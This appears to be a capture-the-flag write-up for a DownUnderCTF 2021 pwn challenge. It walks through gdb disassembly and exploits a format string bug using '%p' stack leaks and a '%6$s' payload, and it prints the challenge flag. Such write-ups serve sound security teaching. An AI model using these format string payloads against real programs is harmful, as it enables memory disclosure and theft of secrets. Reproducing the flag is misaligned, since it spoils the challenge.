## Intro
**Leaking like a sieve** was a pwn challenge at DownUnderCTF 2021.  

You were given a binary to exploit.

## Investigation
`checksec` showed that NX and PIE are enabled for the binary. Following the `ltrace` I learned the flow of the program and found no potential
buffer overflow vulnerability at first sight. I loaded the program into `gdb` and disassembled the `main` function, which was the only function of interest here.

```
...
0x0000000000001201 <+41>:	lea    rsi,[rip+0xe00]        # 0x2008  "r"
0x0000000000001208 <+48>:	lea    rdi,[rip+0xdfb]        # 0x200a  "./flag.txt"
0x000000000000120f <+55>:	call   0x1080 <fopen@plt>
...
0x000000000000125d <+133>:	lea    rax,[rbp-0x50]
0x0000000000001261 <+137>:	mov    esi,0x20
0x0000000000001266 <+142>:	mov    rdi,rax
0x0000000000001269 <+145>:	call   0x1070 <fgets@plt>
0x000000000000126e <+150>:	lea    rdi,[rip+0xe1c]        # 0x2091  "\nHello there, "
0x0000000000001275 <+157>:	mov    eax,0x0
0x000000000000127a <+162>:	call   0x1060 <printf@plt>
0x000000000000127f <+167>:	lea    rax,[rbp-0x50]
0x0000000000001283 <+171>:	mov    rdi,rax
0x0000000000001286 <+174>:	mov    eax,0x0
0x000000000000128b <+179>:	call   0x1060 <printf@plt>
...
```

We can see here that the program reads in the flag from a file somewhere in the beginning. Later, it asks the user for input, which gets stored at `rbp-0x50`,
and prints it out again using `printf`. Using this input as the first and only parameter to `printf` a format string vulnerability
is introduced. We can verify this by inputting some format strings like `%p %p %p %p %p %p %p %p` and see that memory addresses from the programs stack get leaked.

```
(gdb) r
...
What is your name?
%p %p %p %p %p %p %p %p

Hello there, 0x7fffffffbd30 (nil) 0x7ffff7ed6387 0x7fffffffde60 (nil) 0x7fffffffde80 0x5555555592a0 0x7025207025207025

What is your name?
```

## Solution
As it happens the flag is the sixth address stored in the stack so we can print that out by inputting `%6$s`. This format string will interpret the sixth
address on the stack as a string and print it out. Et voila!

```
(gdb) r
...
What is your name?
%6$s

Hello there, DUCTF{f0rm4t_5p3c1f13r_m3dsg!}
```

See [exploit](./exploit.py) for an automation of the exploit written in python.

> DUCTF{f0rm4t_5p3c1f13r_m3dsg!}
